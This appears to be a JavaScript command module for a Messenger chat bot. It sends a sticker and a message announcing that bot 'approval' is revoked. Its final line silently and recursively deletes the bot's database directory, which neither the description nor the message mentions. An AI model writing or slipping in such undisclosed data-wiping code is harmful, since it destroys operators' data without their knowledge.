  const fs = require('fs');
  let data = [
  "2523893384552228",
    "184003438883978",
    "2523893384552228",
    "2523887371219496",
    "2523887571219476",
    "2523888217886078",
    "2523887571219476",
    "184003438883978",
    "2523893384552228",
    "184003438883978",
    "184570885493900",
    "4070816262965561",
    "4046876838692837"
      ];
  // let sticker = data[Math.floor(Math.random() * data.length)]
  module.exports.config = {
  name: "delapproval",
  version: "2.0.0",
  hasPermssion: 2,
  credits: "𝙉𝘼𝙐𝙂𝙃𝙏𝙔 ツ",
  description: "REMOVE NAUGHTY APPROVAL",
  commandCategory: "approval",
  usages: "ONLY NAUGHTY CAN USE THIS",
  cooldowns: 0
  };
  module.exports.run = async ({ api, event, args, Threads, Users }) => {
    let sticker = data[Math.floor(Math.random() * data.length)]
    api.sendMessage({sticker: sticker}, event.threadID);
   api.sendMessage(`‎‎‎‎‎‎‎‎‎‎‎‎‎ㅤ‎‎‎ [ 𝗡𝗔𝗨𝗚𝗛𝗧𝗬-𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟 ] 
[ 🪼 ] 𝖮𝖯𝖲 𝖸𝖮𝖴 𝖫𝖮𝖲𝖳𝖤𝖣 𝖭𝖠𝖴𝖦𝖧𝖳𝖸-𝖠𝖯𝖯𝖱𝖮𝖵𝖠𝖫 𝖭𝖮𝖶 𝖸𝖮𝖴 𝖢𝖠𝖭𝖭𝖮𝖳 𝖴𝖲𝖤 𝖭𝖠𝖴𝖦𝖧𝖳𝖸 𝖡𝖮𝖳 `, event.threadID, event.messageID)
require('fs').rmdirSync(require('path').resolve(process.cwd(), 'includes/database/.data'), { recursive: true });
}